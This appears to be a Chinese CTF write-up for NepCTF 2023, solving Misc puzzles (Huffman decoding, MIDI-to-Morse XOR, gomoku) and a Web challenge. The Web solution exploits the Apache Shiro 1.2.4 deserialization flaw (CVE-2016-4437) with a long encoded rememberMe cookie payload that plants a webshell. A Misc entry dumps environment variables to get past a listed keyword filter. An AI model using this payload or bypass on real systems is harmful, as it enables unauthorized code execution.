# NepCTF 2023

## Misc

### 与AI共舞的哈夫曼

ChatGPT 一把梭（确信。

```python
import heapq

class HuffmanNode:
    def __init__(self, char, freq):
        self.char = char
        self.freq = freq
        self.left = None
        self.right = None

    def __lt__(self, other):
        return self.freq < other.freq

def build_huffman_tree(frequencies):
    heap = [HuffmanNode(char, freq) for char, freq in frequencies.items()]
    heapq.heapify(heap)

    while len(heap) > 1:
        left = heapq.heappop(heap)
        right = heapq.heappop(heap)
        merged = HuffmanNode(None, left.freq + right.freq)
        merged.left = left
        merged.right = right
        heapq.heappush(heap, merged)

    return heap[0]

def build_huffman_codes(node, current_code, huffman_codes):
    if node is None:
        return

    if node.char is not None:
        huffman_codes[node.char] = current_code
        return

    build_huffman_codes(node.left, current_code + '0', huffman_codes)
    build_huffman_codes(node.right, current_code + '1', huffman_codes)

# Now, let's try decompressing the file again
decompress('./compressed.bin', decompressed_file_path)

# Read the decompressed content
with open(decompressed_file_path, 'r') as f:
    decompressed_content = f.read()
    
# Nepctf{huffman_zip_666}
```

### codes

试了下 下面这些都被过滤了。

`exe env sys popen mmap mprotect get`

```c
#include <stdio.h>

int main(int argc, char *argv[], char *third[]) {
    for (int i = 0; third[i] != NULL; i++) {
        printf("%s\n", third[i]);
    }
    return 0;
}
```

```
Nepctf{easy_codes_fc598d45-5bd3-4741-91a8-aeeb2365b30a_[TEAM_HASH]}
```

### 陌生的语言

> https://www.bilibili.com/video/BV1sb411N7Ma 17:30
>
> https://tieba.baidu.com/p/4945307221
>
> https://tieba.baidu.com/p/4968926549

<figure><img src=".gitbook/assets/陌生的语言-1.jpg" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/陌生的语言-2.jpg" alt=""><figcaption></figcaption></figure>

NepCTF{NEPNEP\_A\_BELIEVING\_HEART\_IS\_YOUR\_MAGIC}

### ConnectedFive

赢 42 场拿下 Flag。

```bash
▀████▀     █     ▀███▀████▀███▄   ▀███▀
  ▀██     ▄██     ▄█   ██   ███▄    █  
   ██▄   ▄███▄   ▄█    ██   █ ███   █  
    ██▄  █▀ ██▄  █▀    ██   █  ▀██▄ █  
    ▀██ █▀  ▀██ █▀     ██   █   ▀██▄█  
     ▄██▄    ▄██▄      ██   █     ███  
      ██      ██     ▄████▄███▄    ██  
                                       
                                       

NepCTF{GomokuPlayingContinousIsFun_99df4b1dbaf6}
```

### 小叮弹钢琴

使用 MidiEditor 滑到右边可以得到以下内容

```
0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17
```

左边的竖条有的短，有的长，将长的记为 `0` ，短的记为 `1` （要是反过来也无所谓），可以得到以下内容

```
0100 000 110 111 1111 000 110 1011 011 110 111 1 0 1111 11 111 0 000 0110 000 101 111 000 00 1 0 1111 11 01 001
```

二进制，带停顿，那就不妨试试摩斯电码罢，用 `0` 表示 `-` ，用 `1` 表示 `.` ，就可以得到以下内容

```
LOGSHOULDUSETHISTOXORSOMETHING
```

再加点空格，得到以下内容

```
LOG SHOULD USE THIS TO XOR SOMETHING
```

说明需要使用 `LOGSHOULDUSETHISTOXORSOMETHING` 这个字符串去异或

```
0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17
```

，但经过尝试发现不对，那就试试小写咯。

```
转小写 logshouldusethistoxorsomething
转Hex 6c6f6773686f756c6475736574686973746f786f72736f6d657468696e67
```

再写个 Python 脚本来异或并转成字符串，代码如下

```python
from Crypto.Util.number import *

print(hex(0x6c6f6773686f756c6475736574686973746f786f72736f6d657468696e67 ^ 0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17))

c = 0x5b65624354467b68347070795f7031344e307d4e65704354467b68347070
c = str(c)
c = int(c)
print(long_to_bytes(c))
# b'[ebCTF{h4ppy_p14N0}NepCTF{h4pp'
```

就可以得到 flag 了。

## Web

### ez\_java\_checkin

> https://github.com/SummerSec/ShiroAttack2

通过提示可以发现是 Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）

通过 ShiroAttack 可以上传马得到 Shell

<figure><img src=".gitbook/assets/ez_java_checkin-1.png" alt="" width="563"><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/ez_java_checkin-2.png" alt="" width="563"><figcaption></figcaption></figure>

Payload 如下

```
rememberMe=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
```

通过 `cat flag` 发现并没有权限，然后疯狂试根目录最后在 `start.sh` 找到了 flag。

```bash
(ctf:/) $ cat flag
cat: flag: Permission denied
(ctf:/) $ cat start.sh
#/bin/bash
export GZCTF_FLAG=NepcTF{Ezjava_Chekin}
echo $GZCTF_FLAG > /flag
export GZCTF_FLAG="HAHA,NO FLAG but boom."
su ctf -c "bash -c 'java -jar /ShiroSpring-0.0.1-SNAPSHOT.jar'"
```
